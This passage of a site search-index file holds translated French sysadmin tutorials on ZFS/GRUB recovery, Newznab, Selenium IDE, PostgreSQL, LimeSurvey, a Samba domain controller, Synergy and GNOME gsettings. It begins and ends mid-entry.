c3t0d0s0 ONLINE 0 0 0 errors: No known data errors This way we can see all the disks involved in the zpool (here c3t0d0s0). We will reinstall grub on all the disks in the zpool with this command: \u003e installgrub -m /boot/grub/stage1 /boot/grub/stage2 /dev/rdsk/c3t0d0s0 Updating master boot sector destroys existing boot managers (if any). continue (y/n)? y stage1 written to partition 1 sector 0 (abs 96406065) stage2 written to partition 1, 267 sectors starting at 50 (abs 96406115) stage1 written to master boot sector Unmount the zpool zpool export rpool Plug back the fiber cables Reboot init 6 That’s it!\nResources link http://fr.wikipedia.org/wiki/ZFS ZFS Admin Documentation http://jean-francois.im/2008/04/faulted-argh.html http://www.sqlpac.com/referentiel/docs/unix-solaris-10-zfs-oracle.htm#L6480 "
            }
        );
    index.add(
            {
                id:  286 ,
                href: "\/Newznab_:_Mise_en_place_d\u0027un_indexeur_de_usenet\/",
                title: "Newznab: Setting up a Usenet Indexer",
                description: "A comprehensive guide on how to install and configure Newznab as a Usenet indexer to work with applications like SABnzbd and Sick-Beard.",
                content: " Software version 0.2.3 Operating System Debian 6 Website Newznab Website Last Update 28/12/2012 Introduction linkNewznab is a Usenet indexer. It can be used with applications like SABnzbd or Sick-Beard.\nInstallation linkHere are the required packages:\naptitude install apache2 php5 libapache2-mod-php5 php5-curl php5-mysql php5-gd php-pear Since we’ll need a MySQL-type database, we’ll take the opportunity to set up MariaDB (follow this link).\nNext, let’s set up Newznab:\ncd /var/www wget http://www.newznab.com/newznab-0.2.3.zip unzip newznab-0.2.3.zip mv newznab-0.2.3 newznab chown -Rf www-data. newznab rm -f newznab-0.2.3.zip Finally, let’s enable Apache’s rewrite mode:\na2enmod rewrite Configuration linkPHP linkWe’ll need to configure some PHP parameters for Newznab to work properly:\nperl -pi -e 's/;date.timezone =.*/date.timezone = Europe\\/Paris/' /etc/php5/cli/php.ini perl -pi -e 's/;date.timezone =.*/date.timezone = Europe\\/Paris/' /etc/php5/apache2/php.ini perl -pi -e \"s/max_execution_time = \\d*/max_execution_time = 120/\" /etc/php5/cli/php.ini perl -pi -e \"s/max_execution_time = \\d*/max_execution_time = 120/\" /etc/php5/apache2/php.ini perl -pi -e \"s/memory_limit = .*/memory_limit = 256M/\" /etc/php5/apache2/php.ini Apache linkHere’s a typical configuration. Feel free to adapt it to your needs:\nOptions FollowSymLinks AllowOverride All Order allow,deny allow from all ServerAdmin admin@example.com ServerName example.com ServerAlias www.example.com DocumentRoot /var/www/newznab/www LogLevel warn ServerSignature Off Then enable it and reload your Apache configuration:\na2ensite newznab /etc/init.d/apache2 reload MySQL linkLet’s configure MySQL/MariaDB by creating a database and a user:\ncreate database newznab; create user 'newznab'@'localhost' identified by 'password'; grant usage ON * . * TO 'newznab'@'localhost' IDENTIFIED BY 'password'; grant ALL on `newznab` .* to 'newznab'@'localhost'; Replace password with your desired password.\nNewznab linkAfter all these modifications, restart your Apache server:\n/etc/init.d/apache2 restart Then connect to your server at http://server/newznab/www and follow the instructions. Once you have added a group, you’ll need to run a script to retrieve the latest headers. The result should be similar to this:\n\u003e cd /var/www/newznab/misc/update_scripts \u003e php update_binaries.php PHP Warning: mysql_pconnect(): Headers and client library minor version mismatch. Headers:50149 Library:50311 in /var/www/newznab/www/lib/framework/db.php on line 12 newznab 0.2.3 Copyright (C) 2012 newznab.com This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. Updating: 1 groups - Using compression? No Processing alt.binaries.teevee Group alt.binaries.teevee has 50,001 new parts. First: 334617788 Last: 454617805 Local last: 0 New group starting with 50000 messages worth. Getting 20,001 parts (454567805 to 454587805) - 30,000 in queue Received 20001 articles of 20001 requested, 0 blacklisted, 0 not binaries 500 bin adds...1000 bin adds...1500 bin adds...2000 bin adds... 2,456 new, 0 updated, 20,001 parts. 4.50 headers, 6.17 update, 10.67 range. Getting 20,001 parts (454587806 to 454607806) - 9,999 in queue Received 20001 articles of 20001 requested, 0 blacklisted, 0 not binaries 500 bin adds...1000 bin adds...1500 bin adds... 1,989 new, 268 updated, 20,001 parts. 4.05 headers, 6.98 update, 11.03 range. Getting 9,999 parts (454607807 to 454617805) - 0 in queue Received 9999 articles of 9999 requested, 0 blacklisted, 1 not binaries 500 bin updates... 487 new, 754 updated, 9,998 parts. 2.84 headers, 4.27 update, 7.11 range. Group processed in 29.74 seconds Updating completed in 30.09 seconds Next, we’ll need to create the releases:\n\u003e php update_releases.php PHP Warning: mysql_pconnect(): Headers and client library minor version mismatch. Headers:50149 Library:50311 in /var/www/newznab/www/lib/framework/db.php on line 12 newznab 0.2.3 Copyright (C) 2012 newznab.com This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. Starting release update process (2012-12-16 00:42:54) updated regexes to revision 1742 Applying regex 2 for group alt.binaries.* Applying regex 1 for group alt.binaries.* Stage 2 Stage 3 Found 0 nfos in 0 releases 0 nfo files processed Site config (site.checkpasswordedrar) prevented checking releases are passworded Processing tv for 0 releases Lookup tv rage from the web - Yes Tidying away binaries which cant be grouped after 2 days Deleting parts which are older than 2 days Deleting binaries which are older than 2 days Processed 0 releases Once these actions have been executed manually, we’ll set them up automatically in crontab:\n0 * * * * /var/www/newznab/misc/update_scripts/cron_scripts/newznab.sh start \u003e /dev/null We’ll also need to set permissions and modify default paths:\nchmod 755 /var/www/newznab/misc/update_scripts/cron_scripts/newznab.sh perl -pi -e 's/\\/usr\\/local\\/www/\\/var\\/www/' /var/www/newznab/misc/update_scripts/cron_scripts/newznab.sh Usage linkImport a server list linkThe default server list is decent, but may not meet your expectations. I’ve created a small example script that retrieves a list of servers from a website, creates a “clean” list, checks if they’re already in the database, then adds them all at once and activates them at the same time. Here’s my script:\n#!/bin/sh # Vars ngs_list='liste_newsgroups' mysql_batch='mysql_batch.sql' database='newznab' login='newznab' password='password' activate=1 url='http://www.binnews.in/_bin/newsgroup.php?country=fr' # Getting URL echo 'Getting newsgroups servers from URL' wget -O $ngs_list.old \"$url\" echo \"Extracting all newsgroups servers\" grep title $ngs_list.old | awk -F\\\" '{ print $2 }' \u003e $ngs_list # Generate sql batch echo \"Generating SLQ batch file in $mysql_batch\" echo \"\" \u003e $mysql_batch for i in `cat $ngs_list` ; do if [ `mysql -u$login -p$password -e \"select name from newznab.groups where name = '$i'\" | grep -c $i` -eq 0 ] ; then echo \"insert into $database.groups (name,backfill_target,first_record,first_record_postdate,last_record,last_record_postdate,last_updated,minfilestoformrelease,minsizetoformrelease,active,description) values ('$i',1,0,NULL,0,NULL,NULL,NULL,NULL,$activate,'$i');\" \u003e\u003e $mysql_batch fi done # Import SQL echo \"Importing batch file in $database database\" mysql -u$login -p$password newznab \u003c $mysql_batch Just fill in the vars section with the correct elements, set the permissions, and run this script for a massive insertion.\n"
            }
        );
    index.add(
            {
                id:  287 ,
                href: "\/Selenium_:_Automatisation_de_t%C3%A2ches_pour_environnements_web\/",
                title: "Selenium: Task Automation for Web Environments",
                description: "Guide explaining how to use Selenium for automating web tasks, including installation and usage of Selenium IDE with Firefox.",
                content: " Software version 1.9.0 Operating System Debian 7 Website Selenium Website Last Update 19/12/2012 Introduction linkSelenium is a development environment designed for creating automated tests for web applications. It consists of an IDE used to develop tests, called Selenium IDE.\nSelenium IDE linkIt’s actually a Firefox plugin, available for free. It allows you to easily record one or more actions in order to replay them later. It records everything the user enters in text fields, all clicks, navigation, etc… And classifies them into tests/test suites to reproduce exactly the requested actions.\nInstalling the plugin linkThe installation of this plugin is done simply from the Mozilla add-ons center. For better ergonomics, it can be coupled with a “button” plugin that will interface it in the main Firefox window, giving easier and faster access to the IDE’s features.\nPlugin interface linkThe plugin has a simple interface, which is obtained by clicking on our magnificent button.\nIt consists of a toolbar for creating/editing/saving tests, a log window to see them running in real time, a test case view, a “Table” view where you can see the actions that will take place, a search bar and a nice recording button.\nUsing the plugin linkRecording a test suite linkBy default, when the IDE starts, recording begins. The test in which actions are recorded is then called “Untitled”. We can see in the screenshot below that it records each action, such as when you click on the Images link in Google after starting it.\nThe actions are located in the “Table” view. By right-clicking on Untitled, you can rename it. Once the recording is finished, simply click again on the recording signal to stop it: your test is done! In the File menu, you can choose “New Test” and start again. Finally, once all your tests are completed, you can save them as a “Test Suite” in the File menu.\nPlaying a test suite linkTo play a test suite, simply open it with the Selenium IDE via the File menu. The test suite then appears in the Test Case view.\nTo launch it, simply click on the first test and launch via the grouped launch button (left) or click on the desired test and launch it individually (right button). You will be able to see the results in the dedicated area.\n"
            }
        );
    index.add(
            {
                id:  288 ,
                href: "\/Installation_et_configuration_de_PostgreSQL\/",
                title: "PostgreSQL Installation and Configuration",
                description: "A comprehensive guide to installing, configuring, and managing PostgreSQL databases including user management, backups, and basic SQL operations.",
                content: " Software version 8.3+ Operating System Debian 6 Website PostgreSQL Website Last Update 16/11/2012 Introduction linkPostgreSQL is an object-relational database management system (ORDBMS). It is a free tool available under a BSD-like license.\nThis system competes with other database management systems, both free (like MySQL and Firebird) and proprietary (like Oracle, Sybase, DB2, and Microsoft SQL Server). Like the Apache and Linux projects, PostgreSQL is not controlled by a single company but is based on a global community of developers and companies.\nInstallation linkTo install PostgreSQL:\napt-get install postgresql postgresql-client This creates the postgres user who has rights over the database. To initialize a PostgreSQL database in the postgres user’s $HOME (/var/lib/postgres on Debian) (the installation on Debian does this automatically):\n\u003e su postgres \u003e cd \u003e /usr/lib/postgresql/8.3/bin/initdb -D data The files in this cluster will belong to user \"postgres\". The server process must also be owned by this user. The cluster will be initialized with locale fr_FR@euro. The default database encoding has been set accordingly to LATIN9. creating directory data... ok creating subdirectories... ok selecting default max_connections... 100 selecting default shared_buffers/max_fsm_pages... 24MB/153600 creating configuration files... ok creating template1 database in data/base/1... ok initializing pg_authid... ok initializing dependencies... ok creating system views... ok loading system objects' descriptions... ok creating conversions... ok initializing access privileges on built-in objects... ok creating information schema... ok vacuuming database template1... ok copying template1 to template0... ok copying template1 to postgres... ok WARNING: enabling \"trust\" authentication for local connections You can change this by editing pg_hba.conf or using the -A option the next time you run initdb. Success. You can now start the database server using: /usr/lib/postgresql/bin/postgres -D data or /usr/lib/postgresql/bin/pg_ctl -D data -l logfile start Note: You need to have correct permissions on /tmp/\nOn Debian 5 (lenny), to initialize the main postgres database, run the following command as root:\npg_createcluster 8.3 main Configuration files are located in $HOME/data, particularly pg_hba.conf for access rights management and postgresql.conf for general service configuration. On Debian, these files are symbolic links to files in /etc/postgresql/.\nConfiguration linkUser Management linkAdmin linkFirst, let’s change the password:\npasswd postgres This will modify the postgres password on the machine, but not on the database. You don’t have to do this if you don’t need to (e.g., if you always go through root then postgres). Now, let’s define a password for the database:\npsql -d template1 -c \"alter user postgres with password 'password'\" or\n\\password postgres This will make the user admin of the template1 database.\nNote: To use web clients or graphical clients presented in the following chapters, you must define a password for “postgres”.\nAuthentication linkBy default, to access PostgreSQL, you need to connect as the “postgres” user. To create a new user, you would need to create a system account for them first, which may not be desirable. To change this configuration, modify the “/etc/postgresql/pg_hba.conf” file and replace “ident sameuser” with “password” on the following two lines:\n[...] local all all ident sameuser host all all 127.0.0.1 255.255.255.255 ident sameuser This becomes:\n[...] local all all password host all all 127.0.0.1 255.255.255.255 password This modification avoids using system accounts and requires a password for each connection.\nTo allow another machine to connect to this Postgres server, add a line like this to the “/etc/postgresql/pg_hba.conf” file:\nhost all all 192.168.0.1 255.255.255.255 password warning WARNING: The order of insertion of the lines is very important! The first line that matches will be the one that takes the rule. So be careful about the insertion order in this file. And modify the “/etc/postgresql/postgresql.conf” file by adding the following option so that postgres listens on all its addresses and not just “localhost”:\nlisten_addresses = '*' Restart PostgreSQL:\n/etc/init.d/postgresql restart Creation linkTo create a user:\n\u003e createuser toto Is the new role a superuser? (y/n) n Can the new user create databases? (y/n) y Can the new user create users? (y/n) n CREATE USER By default, this user has no password. To assign one:\npsql -d template1 -c \"alter user toto with password \" Suppression linkTo delete a user:\ndrop user toto Database Management linkCreation linkThe following command creates the “mybase” database for the user “toto” using the “UNICODE” encoding:\nCREATE DATABASE owner ; Be careful with the table encoding: LATIN9, LATIN1, UNICODE, etc.\nSuppression linkTo delete a database:\nDROP DATABASE Listing linkTo list existing databases:\npsql -l Backing Up a Database linkTo back up a database:\npg_dump DATABASE_NAME \u003e FILE_NAME Backing Up All Databases linkTo back up all databases at once:\npg_dumpall \u003e FILE_NAME Backups on Very Large Databases linkIt seems that by passing certain parameters, it is easier to restore databases:\npg_dump -Ft DATABASE_NAME \u003e FILE_NAME https://www.postgresql.org/docs/8.1/static/app-pgdump.html Note: Be aware of some limitations in “hot” backups.\nRestoration linkTo restore a database, first create an empty database, then import:\npsql \u003c FILE_NAME Displaying All Queries linkYou can increase the log level to see all queries that pass through. These queries will be recorded in a file.\nwarning This can slow down your system if you have a lot of activity To set up a higher log level, edit these lines in the PostgreSQL configuration:\n[...] logging_collector = on log_directory = 'pg_log' log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' log_statement = 'all' [...] Just restart your PostgreSQL to see logs appear in /var/lib/postgresql//main/pg_log\nUsage linkYou can now “use” your database with the PostgreSQL command line client:\n\u003e psql -h hostname -U user -d database mybase=# Here are some useful commands to remember:\n\\l = list databases \\d = list tables \\q = quit \\h = help SELECT version(); = PostgreSQL version SELECT current_date; = current date \\i file.sql = read instructions from file.sql \\d table = describe a table (like DESCRIBE in MySQL) Creating and Deleting Tables linkHere are the different data types for table fields:\nCHAR(n) VARCHAR(n) INT REAL DOUBLE PRECISION DATE TIME TIMESTAMP INTERVAL Note: You can also define your own data types.\nThe creation syntax:\nCREATE TABLE my_table (col1 TYPE, [...], coln TYPE); Deletion:\nDROP TABLE my_table; As a small example taken from the PostgreSQL documentation:\nCREATE TABLE weather ( city VARCHAR(80), temp_lo INT, -- low temperature temp_hi INT, -- high temperature prcp REAL, -- precipitation DATE DATE ); info Two dashes – introduce comments… Data Extraction linkNothing beats examples:\nSELECT * FROM weather; SELECT city, (temp_hi+temp_lo)/2 AS temp_avg, DATE FROM weather; SELECT * FROM weatherWHERE city = 'San Francisco' AND prcp \u003e 0.0; SELECT DISTINCT city FROM weather ORDER BY city; With joins:\nSELECT * FROM weather, cities WHERE city = name; SELECT weather.city, weather.temp_lo, cities.location FROM weather, cities WHERE cities.name = weather.city; SELECT * FROM weather INNER JOIN cities ON (weather.city = cities.name); SELECT * FROM weather LEFT OUTER JOIN cities ON (weather.city = cities.name); SELECT * FROM weather w, cities c WHERE w.city = c.name; With functions (Aggregate Functions):\nSELECT MAX(temp_lo) FROM weather; Note that “Aggregate Functions” cannot be used in the WHERE clause. So the following query is incorrect:\nSELECT city FROM weather WHERE temp_lo = MAX(temp_lo); You should do instead:\nSELECT city FROM weather WHERE temp_lo = (SELECT MAX(temp_lo) FROM weather); You can, of course, use “GROUP BY …”, “HAVING …”, etc.\nData Updates linkStill with an example:\nUPDATE weather SET temp_hi = temp_hi - 2, temp_lo = temp_lo - 2 WHERE DATE \u003e '1994-11-28'; Data Deletion linkAgain with an example:\nDELETE FROM weather WHERE city = 'Hayward'; To delete all data from a table:\nDELETE FROM weather; Querying a Database Size link SELECT pg_size_pretty(pg_database_size('database_name')); FAQ linkTsearch linkIf an application requires tsearch2 for example, you need to install a package:\naptitude install postgresql-contrib-8.2 Use your corresponding version number at the end of the package.\nAnd finally, you need to patch the database in question:\npsql wikidb \u003c /usr/share/postgresql/8.2/contrib/tsearch2.sql Here wikidb is my database, and 8.2 is the postgres version again.\nUTF8 Encoding Doesn’t Match the Locale linkThe annoying error that bugged me. This happens when you want to create a database that’s not in the server’s current encoding:\ncreatedb: database creation failed: ERROR: UTF8 encoding does not match locale fr_FR@euro of the server DETAIL: The LC_CTYPE server parameter requires the LATIN9 encoding. To fix the problem, first check that the locales are good at the OS level:\ndpkg-reconfigure locales Then, let’s say I want UTF-8, I set my environment variables properly:\nexport LC_ALL=fr_FR.UTF-8 export LANG=fr_FR.UTF-8 export PGCLIENTENCODING=fr_FR.UTF-8 Now I can list the postgres environment variable:\n$ postgres=# show lc_ctype; lc_ctype ------------- fr_FR.UTF-8 (1 line) Normally if you create a new database, the encoding will now be UTF-8. If that still doesn’t change anything, you must run this, but it will put all your future databases in this format:\ninitdb -E UTF-8 Now try creating a database again.\nResources linkPostgreSQL Official Website\nhttps://www.postgresql.org/docs/7.3/static/multibyte.html\nSystem Views in PostgreSQL 8.3\n"
            }
        );
    index.add(
            {
                id:  289 ,
                href: "\/Limesurvey_:_Mise_en_place_d\u0027une_solution_de_Sondages\/",
                title: "Limesurvey: Setting up a Survey Solution",
                description: "Learn how to install and configure Limesurvey, a complete survey solution for your web server, allowing you to create and manage sophisticated surveys.",
                content: " Software version 2.00+ (Build 121115) Operating System Debian 6 + backports Website Limesurvey Website Last Update 14/11/2012 Introduction linkLimeSurvey is a web application that is installed on the user’s server. After installation, the user can manage LimeSurvey from a web interface. It provides a complete text editor to write questions and messages, and also allows integration of images and videos into surveys. The layout and design of surveys can be modified by changing the template. Templates can be modified using a WYSIWYG (What You See Is What You Get) HTML editor.\nAdditionally, templates can be easily imported and exported through the template editor. Once a survey is complete, the user can activate it, making it available to all. Similarly, you can import and export questions through the interface editor. LimeSurvey allows you to create as many surveys as desired. There is also no limit on the number of invited participants. Apart from technical and practical constraints, there are no limits on the number of questions each survey can have.\nQuestions are added by group. Questions in the same group are displayed on the same page. Surveys can contain many different question types: lists, multiple choice, text, numeric, as well as simple “yes” or “no” answers. Questions can be organized with arrows, with options for questions on one axis based on the other axis. Questions can also depend on answers to previous questions. For example, a voter can answer a question about transportation if they answered affirmatively to a question about employment.1\nThis tutorial is based on the latest stable version of Limesurvey.\nInstallation linkFor the installation, we need the following:\naptitude install postgresql-8.4 apache2 apache2 libapache2-mod-php5 php5 php5-gd php5-imap php5-ldap php5-pgsql Next, we’ll download the latest version of Limesurvey, extract it, and set the proper permissions:\ncd /var/www wget -O limesurvey.tgz http://www.limesurvey.org/fr/stable-release/finish/25-latest-stable-release/686-limesurvey200plus-build121115targz tar -xzvf limesurvey.tgz chown -Rf www-data. limesurvey Configuration linkWe’ll create a PostgreSQL user and database. To begin, let’s configure the authentication part:\n[...] # Database administrative login by UNIX sockets local all postgres ident # TYPE DATABASE USER CIDR-ADDRESS METHOD # Limesurvey local limesurvey limesurvey md5 host limesurvey limesurvey 127.0.0.1/32 md5 # \"local\" is for Unix domain socket connections only local all all ident # IPv4 local connections: host all all 127.0.0.1/32 md5 # IPv6 local connections: host all all ::1/128 md5 Now let’s create users, databases, and grant access:\nsu postgres psql create user limesurvey password 'limesurvey' nosuperuser; create database limesurvey owner limesurvey; Replace the password part with the password you desire.\nThen we restart everything to ensure the new configuration is active:\nservice postgresql restart For the Limesurvey configuration part, it’s simple, everything is done via the wizard: http://server/limesurvey\nFollow the instructions and that’s it, all that’s left is to use it :-)\nReferences link http://fr.wikipedia.org/wiki/LimeSurvey ↩︎\n"
            }
        );
    index.add(
            {
                id:  290 ,
                href: "\/Installation_et_configuration_de_Samba_en_mode_Contr%C3%B4leur_de_domaine\/",
                title: "Installing and configuring Samba as a Domain Controller",
                description: "A guide on how to install and configure Samba to function as a domain controller with OpenLDAP backend.",
                content: "Introduction linkSamba is very versatile and can emulate a domain controller (similar to Windows NT4).\nConfiguration linkHere is a typical configuration for this type of environment with an OpenLDAP backend:\n(/etc/samba/smb.conf):\n[global] workgroup = deimos.fr netbios name= %h server string = Controleur du domaine deimos.fr log level = 2 #log file = /var/log/samba/smbd.log log file = /var/log/samba/%m.log max log size = 5000 security = user encrypt passwords = yes obey pam restrictions = No socket options = TCP_NODELAY SO_RCVBUF=8192 SO_SNDBUF=8192 local master = yes os level = 65 domain master = yes preferred master = yes domain logons = yes logon script = netlogon.vbs logon path = logon drive = logon home = wins support = yes dns proxy = no unix extensions = no # LDAP # Pour que Samba puisse lire et écrire dans l'annuaire : smbpasswd -w mypassword ldap suffix = dc=deimos.fr,dc=local ldap machine suffix = ou=hosts ldap user suffix = ou=users ldap group suffix = ou=groups ldap admin dn = uid=samba,ou=utilisateurs,dc=local ldap ssl = Start_tls ldap passwd sync = yes passdb backend = ldapsam:\"ldap://ldap-slave1 ldap://ldap-slave2\" [netlogon] comment = Network Logon Service path = /mnt/netlogon browseable = no writable = no share modes = no [homes] path = /datas/users/%U valid users = %U comment = %U personnal folder browseable = no writable = yes [partage] path = /mnt/partage comment = partage browseable = yes create mask = 0700 directory mask = 0700 create mode = 0700 directory mode = 0700 writable = yes #valid users = @\"utilisateurs du domaine\" [commons] path = /mnt/commons comment = commons browseable = yes writable = yes valid users = @\"utilisateurs du domaine\" Resources linkDocumentation on installing a Samba Domain\n"
            }
        );
    index.add(
            {
                id:  291 ,
                href: "\/Synergy_:_Multi_screens_avec_plusieurs_ordinateurs\/",
                title: "Synergy: Multi-screen Setup with Multiple Computers",
                description: "Learn how to set up Synergy to share keyboard and mouse across multiple computers with different operating systems.",
                content: " Software version 1.3 Operating System Debian 6\nMac OS 10.5+ Website Synergy Website Last Update 07/11/2012 Introduction linkSynergy allows you to easily share your mouse and keyboard between multiple computers. It is free and Open Source. Simply move your mouse from one computer to another by crossing their edges, just like moving between multiple monitors in a multi-screen setup. You can even share clipboards (copy-paste). All you need is a network connection. Synergy is cross-platform (works on Windows, Mac OS X and Linux).\nInstallation linkChoose your installation type based on your operating system\nMac linkDownload the DMG, then copy the binaries to /usr/local/bin/. Go to the folder containing the binaries and run this command:\nsudo cp ./synergyc ./synergys /usr/local/bin/synergyc mkdir -p ~/Library/synergy cp synergy.conf ~/Library/synergy There you go, it’s now installed :-)\nWindows linkDownload the installer and simply run it.\nLinux linkLet’s do it as usual:\naptitude install synergy Configuration linkThe configuration may seem complex, but it’s not. Just remain logical. We won’t cover how to configure on Windows, as everything is done with clicks and is really simple. We’ll focus on the Mac/Unix part.\nThe server linkMac linkThe server will determine what each machine does. For clients, there are no configuration files; everything is on the server. I’ll take a typical configuration file and explain it. But first, there’s something important to understand.\nwarning The names to insert in the configuration file correspond to the machine names OR their DNS names To edit the configuration file:\n# ~/Library/synergy/synergy.conf section: screens water: earth: end section: links water: left = earth earth: right = water end section: aliases water: water.deimos.fr earth: earth.deimos.fr end Here, water corresponds to the server machine, and earth to the client machine. In the screens section, you need to declare all machines. I have only 2 here (server + client).\nNext, we declare with links how the edges of the screens should interact. Here, earth is to the left of water and water is to the right of earth. Just read the configuration lines from right to left and make a sentence to understand how to configure the system.\nThe last section aliases is optional. It allows you to associate a name with a DNS name.\nLinux linkFor configuration, please refer to the Mac section above and put this in ~/.synergy.conf.\nThe client linkThere is no client configuration :-)\nLaunching \u0026 automation linkLet’s see how to test and automate these processes.\nServer linkMac linkHere’s the command line to start the server. Don’t forget to change the server name. Here server should be replaced by water. Launch the tests:\nsynergys -f --config ~/Library/synergy/synergy.conf --name Now that the tests are complete, we can set up automatic startup so we don’t have to type this every time. Let’s start by creating what we need:\nsudo mkdir -p /Library/StartupItems/Synergy sudo chmod 755 /Library/StartupItems/Synergy/Synergy ; sudo touch /Library/StartupItems/Synergy/StartupParameters.plist Then, we’ll edit the following file:\n# /Library/StartupItems/Synergy/Synergy #!/bin/sh . /etc/rc.common run=(/usr/local/bin/synergys -f --config /Users/deimos/Library/synergy/synergy.conf --name server) KeepAlive () { proc=${1##*/} while [ -x \"$1\" ] ; do if ! ps axco command | grep -q \"^${proc}\\$\" ; then \"$@\" fi sleep 3 done } StartService () { ConsoleMessage \"Starting Synergy\" KeepAlive \"${run[@]}\" \u0026 } StopService () { return 0 } RestartService () { return 0 } RunService \"$1\" Don’t forget to replace server with your machine name and deimos with your username.\nThen, edit the StartupParameters.plist file:\n# StartupParameters.plist { Description = \"Synergy Client\"; Provides = (\"Synergy\"); Requires = (\"Network\"); OrderPreference = \"None\"; } Restart your computer and it’s done :-)\nLinux linkFor Linux, once your configuration is done, all that’s left is to launch the server:\nsynergys Client linkMac linkTo test connecting to the server, nothing could be simpler, open a terminal and type this command:\nsynergyc \u0026 Replace server with the name of the machine acting as the Synergy server.\nNow that the tests are complete, we can set up automatic startup so we don’t have to type this every time. Let’s start by creating what we need:\nsudo mkdir -p /Library/StartupItems/Synergy sudo chmod 755 /Library/StartupItems/Synergy/Synergy ; sudo touch /Library/StartupItems/Synergy/StartupParameters.plist Then, we’ll edit the file:\n# /Library/StartupItems/Synergy/Synergy #!/bin/sh . /etc/rc.common run=(/usr/local/bin/synergyc -n $(hostname -s) -1 -f synergy-server) KeepAlive () { proc=${1##*/} while [ -x \"$1\" ] ; do if ! ps axco command | grep -q \"^${proc}\\$\" ; then \"$@\" fi sleep 3 done } StartService () { ConsoleMessage \"Starting Synergy\" KeepAlive \"${run[@]}\" \u0026 } StopService () { return 0 } RestartService () { return 0 } RunService \"$1\" Don’t forget to replace server with your machine name.\nThen, edit the StartupParameters.plist file:\n# StartupParameters.plist { Description = \"Synergy Client\"; Provides = (\"Synergy\"); Requires = (\"Network\"); OrderPreference = \"None\"; } Restart your computer and it’s done :-)\nLinux linkFor the client, it’s simple, just specify the server:\nsynergyc That’s all :-)\nGraphical Interface linkThere is now a simple graphical interface to configure Synergy called QuickSynergy:\nhttp://quicksynergy.sourceforge.net/\nFAQ linkMy Synergy client keyboard is in English, how do I change it to another language? linkYou just need to add the “English(US)” language in your keyboard layout. Then restart the Synergy client and it’s done :-)\n"
            }
        );
    index.add(
            {
                id:  292 ,
                href: "\/Gnome-shell_:_utilisation_de_settings_pour_configurer_votre_desktop\/",
                title: "GNOME Shell: Using Settings to Configure Your Desktop",
                description: "A guide on how to use GNOME Shell settings to configure your desktop environment, including showing date/time, workspace settings, changing backgrounds and more.",
                content: " Software version 3.4.2 Operating System Debian 7 Website Gnome Website Last Update 06/11/2012 Introduction linkSince GNOME Shell has been released, there is a tool that allows you to configure all sorts of things for your GNOME. Similar to gconf-editor, but from the command line.\nUsage linkEnable Date in the Top Bar linkTo enable the date next to the time in the top bar of GNOME Shell:\ngsettings set org.gnome.shell.clock show-date true Display Seconds linkTo display seconds in the time in the top bar:\ngsettings set org.gnome.shell.clock show-seconds true Multi Workspace in Dual Screen linkTo enable all workspaces when you have multiple screens:\ngsettings set org.gnome.shell.overrides workspaces-only-on-primary false Change Wallpaper linkTo change the wallpaper:\ngsettings set org.gnome.desktop.background picture-uri \"file:/home/pmavro/Images/wallpaper.png\" I have also created an article about automatic wallpaper changes.\nChange Dock Position linkIf you have enabled the dock, it’s possible to change its position:\ngsettings set org.gnome.shell.extensions.dock position left gsettings set org.gnome.shell.extensions.dock position right Change Default Applications linkDefault applications can be changed graphically. However, if what you need is not in the list of available applications, it’s possible to modify this. Here is an example I found1:\n[Default Applications] application/javascript=gvim.desktop application/lrf=calibre-lrfviewer.desktop application/msword=libreoffice-writer.desktop application/rtf=libreoffice-writer.desktop application/vnd.oasis.opendocument.spreadsheet=libreoffice-calc.desktop application/vnd.oasis.opendocument.text=libreoffice-writer.desktop application/vnd.rn-realmedia=mplayer.desktop application/x-cbr=comix.desktop application/x-extension-htm=firefox.desktop application/x-extension-html=firefox.desktop application/x-extension-shtml=firefox.desktop application/x-extension-xhtml=firefox.desktop application/x-extension-xht=firefox.desktop application/x-perl=gvim.desktop application/x-php=gvim.desktop application/x-rar=comix.desktop application/x-shellscript=gvim.desktop application/xhtml+xml=firefox.desktop application/xml=gvim.desktop application/x-yaml=gvim.desktop application/zip=comix.desktop audio/mp4=audacious.desktop image/gif=gqview.desktop image/jpeg=gqview.desktop image/png=gqview.desktop inode/directory=pcmanfm.desktop; text/css=gvim.desktop text/html=firefox.desktop;chromium-browser.desktop; text/plain=leafpad.desktop;gvim.desktop; text/x-chdr=gvim.desktop text/x-csrc=gvim.desktop text/x-python=gvim.desktop video/mp4=mplayer.desktop video/mpeg=mplayer.desktop video/quicktime=mplayer.desktop video/webm=mplayer.desktop video/x-flv=mplayer.desktop video/x-matroska=mplayer.desktop video/x-ms-wmv=mplayer.desktop video/x-msvideo=mplayer.desktop video/x-ogm+ogg=mplayer.desktop x-scheme-handler/http=firefox.desktop;chromium-browser.desktop; x-scheme-handler/https=firefox.desktop;chromium-browser.desktop; x-scheme-handler/feed=thunderbird.desktop x-scheme-handler/ftp=firefox.desktop;chromium-browser.desktop; x-scheme-handler/mailto=thunderbird.desktop x-scheme-handler/news=thunderbird.desktop x-scheme-handler/nntp=thunderbird.desktop x-scheme-handler/snews=thunderbird.desktop [Added Associations] application/javascript=gvim.desktop; application/msword=libreoffice-writer.desktop; application/rtf=libreoffice-writer.desktop; application/vnd.oasis.opendocument.spreadsheet=libreoffice-calc.desktop; application/vnd.oasis.opendocument.text=libreoffice-writer.desktop; application/vnd.rn-realmedia=mplayer.desktop; application/x-cbr=comix.desktop; application/x-extension-htm=firefox.desktop;chromium-browser.desktop; application/x-extension-html=firefox.desktop;chromium-browser.desktop; application/x-extension-shtml=firefox.desktop;chromium-browser.desktop; application/x-extension-xhtml=firefox.desktop;chromium-browser.desktop; application/x-extension-xht=firefox.desktop;chromium-browser.desktop; application/x-perl=gvim.desktop; application/x-php=gvim.desktop; application/x-rar=comix.desktop; application/x-shellscript=gvim.desktop; application/xhtml+xml=firefox.desktop; application/xml=gvim.desktop; application/x-yaml=gvim.desktop; application/zip=comix.desktop; audio/mp4=audacious.desktop; image/gif=gqview.desktop; image/jpeg=gqview.desktop; image/png=gqview.desktop; inode/directory=pcmanfm.desktop; text/css=gvim.desktop; 